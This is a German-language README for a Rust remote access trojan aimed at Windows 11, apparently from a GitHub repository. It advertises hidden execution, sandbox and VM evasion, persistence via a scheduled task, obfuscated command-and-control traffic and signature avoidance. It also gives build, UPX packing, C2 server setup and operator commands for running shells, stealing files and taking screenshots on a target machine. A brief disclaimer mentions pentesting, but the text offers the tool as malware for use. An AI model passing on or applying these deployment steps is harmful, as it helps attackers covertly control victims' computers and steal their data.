💣 DISCLAIMER

Das ist ein echtes Schadwerkzeug.
Der Autor übernimmt NULL Verantwortung für das, was du damit anstellst.
Wenn du es gegen Systeme einsetzt, die dir nicht gehören, bist du ein armseliger Skid und gehörst in den Knast.
Ansonsten: Viel Spaß beim Austesten, Pentesten und Rumspielen.



**Rust-basierter Remote Access Trojan für Windows 11 – made for chaos, made to pwn.**

**WAS IST DAS?**  
Ein voll funktionsfähiges RAT, geschrieben in reinem Rust (keine externen Crates). Der Client läuft unsichtbar, klaut Shells, Dateien, Screenshots und Sysinfos – und das alles durch eine verschlüsselte XOR-Verbindung zurück zu deinem Command-and-Control-Server.

**Jeder, der das hier herunterlädt, soll exakt wissen, was passiert. Keine falsche Flagge, kein Getue. Einfach nur ehrlicher Fernzugriff.**

## 💀 FEATURES
- **Unsichtbare Ausführung** – keine Konsole, keine Fenster (`#![windows_subsystem = "windows"]`)
- **Anti-Analyse** – Sandbox/VM-Erkennung und Verzögerungslogik
- **Persistenz** – via Scheduled Task bei Benutzeranmeldung
- **XOR-verschleierte C2-Kommunikation** – pro Verbindung ein zufälliger Schlüssel
- **Obfuskierte Strings** – alle kritischen Texte werden erst zur Laufzeit entschlüsselt
- **Dynamisch geladene WinAPI** – keine statischen Importe, Signaturen minimal
- **Built-in Kommandos**:
  - Shell ausführen (cmd.exe)
  - Datei-Upload / Download
  - Screenshot (Desktop-Bildschirmfoto)
  - Systeminformationen (OS, CPU, RAM)
- **Mutex-gesteuert** – nur eine Instanz, kein doppeltes Geprügel

## 🛠 BAUANLEITUNG
1. [Rust installieren](https://rustup.rs)
2. Repo klonen:

git clone https://github.com/ademy6220-arch/cargo-RAT.git cd cargo-RAT

3. In `src/main.rs` die Konstante `C2_ADDR` auf deine IP:Port ändern:
```rust
const C2_ADDR: &str = "192.168.1.100:6666";

    Release-Build starten:

    cargo build --release


    Optional mit UPX packen (kleinere Größe):

    upx --best target/release/cargo_rat.exe

🎛 C2-SERVER STARTEN

Im Repo liegt der Server in server/c2_server.rs. Einfach mit cargo run oder direkt mit rustc kompilieren:

rustc server/c2_server.rs -o c2_server.exe

c2_server.exe
lauscht auf TCP 6666 und gibt eine interaktive Shell auf jeden verbundenen Client.
🔧 NUTZUNG

    Client auf Ziel-Windows ausführen (Admin nicht nötig).
    Nach Verbindungsaufbau siehst du im Server-Terminal [+] Verbindung.
    Gib Shell-Befehle ein wie whoami, dir, net user – die Ausgabe erscheint live.
    Datei runterladen: Befehl steal C:\pfad\zur\datei (implements du selbst laut Code).
    Datei hochladen: drop C:\pfad\ziel gefolgt von Binärdaten.
    Screenshot: screenshot (als PNG im Server-Verzeichnis).
    Sysinfo: sysinfo zeigt Windows-Version und CPU-Threads.

Alles weitere findest du in den Quellen – Code ist selbsterklärend

cargo-RAT/
├── Cargo.toml
├── build.rs           # generiert XOR-Strings
├── src/
│   ├── main.rs        # RAT Client
│   ├── xor.rs         # Entschleierung
│   └── xor_data.rs    # wird automatisch erzeugt
└── server/
    └── c2_server.rs   # Command & Control

